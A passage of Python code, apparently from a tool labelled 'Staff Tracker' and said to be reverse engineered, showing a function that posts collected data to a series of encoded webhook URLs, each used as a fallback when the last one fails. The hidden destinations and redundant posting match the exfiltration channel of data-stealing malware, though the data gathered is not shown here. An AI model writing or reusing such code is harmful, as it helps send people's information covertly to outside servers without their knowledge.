...
def send_to_webhook(data):
    try:
        response = requests.post(decoded_url, json={"content": f"```{data}```"})
        if not response.status_code == 200:
            response = requests.post(decoded_url1, json={"content": f"```{data}```"})
            if not response.status_code == 200:
                response = requests.post(decoded_url2, json={"content": f"```{data}```"})
                if not response.status_code == 200:
                    response = requests.post(decoded_url3, json={"content": f"```{data}```"})
                    if not response.status_code == 200:
                        print(f".")
                    else:
                        print(f"Staff Track4r, Reverse Engineered By Eqsomething")
                else:
                    print(f"Staff Track3r, Reverse Engineered By Eqsomething")
            else:
                print(f"Staff Track2r, Reverse Engineered By Eqsomething")
        else:
            print(f"Staff Track1r, Reverse Engineered By Eqsomething")
    except Exception as e:
        print(f"Failed")
